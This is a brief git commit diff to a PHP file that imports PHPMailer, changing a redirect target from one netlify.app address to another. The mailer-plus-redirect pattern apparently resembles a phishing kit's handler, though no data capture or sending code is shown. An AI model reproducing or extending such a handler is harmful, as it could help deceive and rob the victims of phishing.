e14bcd421b9823cfdf163e7ff1e6a26947be4eae
maxibooy <maxiibooy001@gmail.com>
2025-08-27 22:50:27 +0500

    Update Bodo.php

--- Bodo.php
+++ Bodo.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://jocular-axolotl-4bd66b.netlify.app/");
+header("Location: https://poetic-paletas-8ef7b7.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
